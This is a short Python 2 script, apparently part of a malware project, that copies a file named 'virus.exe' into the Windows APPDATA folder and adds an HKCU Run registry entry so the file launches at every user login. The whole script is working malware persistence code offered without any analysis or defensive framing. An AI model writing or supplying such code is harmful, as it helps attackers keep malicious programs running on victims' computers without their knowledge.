import sys, os
from shutil import copyfile

apdat = os.getenv('APPDATA')

def windows_persistence():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU

    global apdat
    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, str(apdat) + '\\virus.exe')
        _winreg.CloseKey(reg_key)
        print 'HKCU Run registry key applied'
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        print 'HKCU Run registry key failed' 
        return False, 'HKCU Run registry key failed' 




copyfile("virus.exe", str(apdat) + '\\virus.exe')
windows_persistence()
